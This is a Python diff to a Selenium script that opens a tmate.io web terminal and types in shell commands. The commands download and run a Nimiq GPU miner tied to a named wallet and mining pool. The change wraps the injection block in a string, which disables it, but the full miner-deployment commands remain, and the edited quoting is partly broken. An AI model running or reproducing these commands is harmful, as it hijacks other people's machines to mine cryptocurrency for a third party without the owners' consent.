@@ -40,11 +40,12 @@ def send(tmate):
   base = "https://tmate.io/t/"
   url = base + tmate
   print(url)
+"""
   driver.get(url)
   time.sleep(3)
   area = driver.find_element_by_xpath('/html/body/div/div/div/div[2]/div/div/div/div/div[2]/div/textarea')
   area.send_keys(Keys.ESCAPE)
-  command = """
+  command = ""
 mkdir NimiqMiner
 cd NimiqMiner
 wget https://github.com/tomkha/nq-miner/releases/download/0.99.7/nq-miner-linux-0.99.7.tar.gz -O nq-nimer-linux.zip
@@ -53,10 +54,11 @@ tar -xzvf nq-nimer-linux.zip -C nq-miner
 rm nq-nimer-linux.zip
 rm ./nq-miner/start_gpu.sh
 ./nq-miner/nq-miner -t cuda -a "NQ718S9KEYU4VCBV4SB5PX73CJJJ3NCV9CM3" -n "ixelizm" -p pool.acemining.co:8443
-"""
+""
   area.send_keys(command)
   driver.quit()
-  return "Başarılı"
+  """
+  return str(url)
     
   
 
